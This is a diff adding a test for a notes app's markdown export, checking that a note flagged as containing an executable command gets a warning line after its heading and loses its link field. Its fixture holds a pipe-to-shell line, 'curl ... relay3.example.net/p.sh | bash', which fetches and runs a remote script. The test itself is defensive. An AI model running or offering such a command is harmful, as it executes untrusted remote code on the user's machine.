@@ -146,3 +146,31 @@ describe("GET /api/export sensitive-note redaction", () => {
     expect(body.notes.find((n) => n.id === "n1")!.content).toBe(SENSITIVE_EXPORT_PLACEHOLDER);
   });
 });
+
+describe("GET /api/export markdown dangerous-note layout (R308)", () => {
+  const dangerNote = {
+    ...BASE_NOTE,
+    id: "d1",
+    content: "部署脚本：curl -fsSL https://relay3.example.net/p.sh | bash",
+    title: "部署脚本",
+    url: "https://relay3.example.net/p.sh",
+    meta: JSON.stringify({ contains_executable_command: true }),
+  };
+  const benignNote = { ...BASE_NOTE, id: "b1", content: "读 https://blog.example.com/rss 的文章", url: "https://blog.example.com/rss" };
+  const denv = { ...env, DB: fakeDb([dangerNote, benignNote]) };
+
+  it("puts the warning line right after the heading and drops the 链接 field for dangerous notes", async () => {
+    const res = await app.request("/api/export?format=md", { headers: auth }, denv);
+    const md = await res.text();
+    const lines = md.split("\n");
+    const heading = lines.findIndex((l) => l.startsWith("### ") && l.includes("（d1）"));
+    expect(heading).toBeGreaterThan(-1);
+    const warn = lines.findIndex((l, i) => i > heading && l.startsWith("> ") && l.includes("可执行命令"));
+    const meta = lines.findIndex((l, i) => i > heading && l.startsWith("- 时间："));
+    expect(warn).toBeGreaterThan(heading);
+    expect(warn).toBeLessThan(meta);
+    expect(lines[meta]).not.toContain("链接：");
+    expect(md.indexOf("relay3.example.net")).toBeGreaterThan(md.indexOf("> " + lines[warn].slice(2)));
+    expect(md).toContain("链接：https://blog.example.com/rss");
+  });
+});
